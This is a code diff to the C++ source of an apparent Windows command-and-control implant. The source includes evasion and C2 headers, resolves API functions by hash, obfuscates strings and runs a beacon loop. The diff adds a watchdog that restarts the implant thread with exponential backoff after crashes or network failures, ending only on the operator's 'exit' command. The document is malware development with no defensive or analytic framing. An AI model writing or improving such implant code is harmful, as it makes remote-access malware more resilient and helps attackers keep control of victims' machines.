@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
+#include <algorithm>
 #include "syscalls.hpp"
 #include "evasion.hpp"
 #include "c2.hpp"
@@ -98,9 +99,11 @@ DWORD WINAPI ImplantThread(LPVOID) {
     fflush(stdout);
     BeaconLoop();
 
+    // BeaconLoop only returns on a clean operator 'exit' command.
+    // Exit code 0 signals the watchdog to stop restarting.
     printf("[DEBUG] BeaconLoop returned (clean exit)\n");
     fflush(stdout);
-    return 0;
+    return 0;  // watchdog sees 0 → stop
 }
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
@@ -110,41 +113,63 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    if (!hKernel32) {
-        printf("[DEBUG] kernel32.dll not found!\n");
-        fflush(stdout);
-        return 0;
-    }
+    if (!hKernel32) return 0;
 
     auto _CreateThread        = HASHPROC(hKernel32, CreateThread);
     auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
     auto _CloseHandle         = HASHPROC(hKernel32, CloseHandle);
     auto _GetExitCodeThread   = HASHPROC(hKernel32, GetExitCodeThread);
     if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
-        printf("[DEBUG] Failed to resolve kernel32 functions\n");
-        fflush(stdout);
         return 0;
     }
 
-    printf("[DEBUG] Creating ImplantThread...\n");
-    fflush(stdout);
-    HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
-    if (!hThread) {
-        printf("[DEBUG] CreateThread failed\n");
+    // ── WATCHDOG RESTART LOOP ─────────────────────────────────────────────
+    // ImplantThread exits on:
+    //   0  — clean operator 'exit' command → we honor it and stop
+    //   1+ — crash, exception, or network failure → restart with backoff
+    //
+    // Backoff schedule: 5s → 10s → 20s → 40s → 60s (capped)
+    // ─────────────────────────────────────────────────────────────────────
+    DWORD restartCount = 0;
+
+    while (true) {
+        if (restartCount > 0) {
+            // Exponential backoff capped at 60 seconds
+            DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
+            printf("[DEBUG] Watchdog: restarting ImplantThread in %lus (restart #%lu)\n",
+                   backoffMs / 1000, restartCount);
+            fflush(stdout);
+            Sleep(backoffMs);
+        }
+
+        printf("[DEBUG] Watchdog: spawning ImplantThread (restart #%lu)\n", restartCount);
         fflush(stdout);
-        return 0;
+
+        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
+        if (!hThread) {
+            printf("[DEBUG] Watchdog: CreateThread failed — retrying in 5s\n");
+            fflush(stdout);
+            Sleep(5000);
+            ++restartCount;
+            continue;
+        }
+
+        _WaitForSingleObject(hThread, INFINITE);
+
+        DWORD exitCode = 0;
+        _GetExitCodeThread(hThread, &exitCode);
+        _CloseHandle(hThread);
+
+        printf("[DEBUG] Watchdog: ImplantThread exited (code=%lu)\n", exitCode);
+        fflush(stdout);
+
+        // Exit code 0 == clean operator 'exit' — respect it
+        if (exitCode == 0) {
+            printf("[DEBUG] Watchdog: clean exit received — terminating\n");
+            fflush(stdout);
+            return 0;
+        }
+
+        ++restartCount;
     }
-
-    printf("[DEBUG] Waiting for ImplantThread to finish...\n");
-    fflush(stdout);
-    _WaitForSingleObject(hThread, INFINITE);
-    DWORD exitCode = 0;
-    _GetExitCodeThread(hThread, &exitCode);
-    printf("[DEBUG] ImplantThread exited with code %lu\n", exitCode);
-    fflush(stdout);
-    _CloseHandle(hThread);
-
-    printf("[DEBUG] WinMain exiting\n");
-    fflush(stdout);
-    return 0;
 }
